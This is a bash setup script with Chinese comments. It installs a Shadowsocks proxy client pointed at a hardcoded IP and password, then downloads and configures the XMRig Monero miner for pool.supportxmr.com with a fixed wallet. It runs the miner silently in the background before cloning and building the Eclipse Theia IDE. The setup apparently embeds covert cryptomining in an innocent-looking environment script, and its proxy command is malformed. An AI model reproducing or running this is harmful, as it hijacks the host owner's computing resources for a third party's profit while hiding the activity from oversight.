#!/bin/bash
# 安裝必要工具
apt update && apt install -y curl unzip git build-essential supervisor

# 安裝 shadowsocks-libev
apt install -y shadowsocks-libev
apt update
apt install -y nodejs npm git curl wget 
npm install -g yarn localtunnel


ss-local -s 3.81.227.209-p 443 -l 1080 -k abc123 -m chacha20-ietf-poly1305 &

sleep 5

# 安裝 xmrig
cd /opt
curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz
tar -xzf xmrig.tar.gz
mv xmrig-6.21.3 xmrig
cd xmrig

# 建立 config.json
cat <<EOF > config.json
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd",
            "pass": "x",
            "tls": true
        }
    ]
}
EOF

# 背景執行礦工
screen ./xmrig > /dev/null 2>&1 &

# 克隆 Theia 範例專案
git clone https://github.com/eclipse-theia/theia.git theia-app
cd theia-app

# 安裝依賴
yarn
